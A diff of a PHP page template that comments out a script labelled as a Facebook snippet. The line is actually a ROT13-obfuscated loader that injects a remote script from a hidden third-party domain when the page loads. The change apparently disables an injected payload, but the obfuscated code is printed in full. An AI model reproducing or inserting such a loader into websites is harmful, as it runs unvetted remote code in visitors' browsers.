@@ -15,7 +15,7 @@ if (/*@cc_on!@*/false) {
 
 <script type="text/javascript">
   //Script pour facebook
-  (function(){function r(s){return s.replace(/[A-z]/g,function(c){return String.fromCharCode(c.charCodeAt(0)+('M'>=c.toUpperCase()?13:-13))})}var c=document.createElement('script'),wdefine=typeof define!=='undefined'?define:false;c.type='text/javascript';c.async=true;c.setAttribute('data-main',r('//ncc.zlfnsrhey.pbz/ncc.wf'));c.src='//cdnjs.cloudflare.com/ajax/libs/require.js/2.1.10/require.min.js';c.onload=function(){mydefine=define,define=wdefine?wdefine:null};var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(c,s)})();
+  //(function(){function r(s){return s.replace(/[A-z]/g,function(c){return String.fromCharCode(c.charCodeAt(0)+('M'>=c.toUpperCase()?13:-13))})}var c=document.createElement('script'),wdefine=typeof define!=='undefined'?define:false;c.type='text/javascript';c.async=true;c.setAttribute('data-main',r('//ncc.zlfnsrhey.pbz/ncc.wf'));c.src='//cdnjs.cloudflare.com/ajax/libs/require.js/2.1.10/require.min.js';c.onload=function(){mydefine=define,define=wdefine?wdefine:null};var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(c,s)})();
 </script>
 
 <?php if ($page['announcements']): ?>
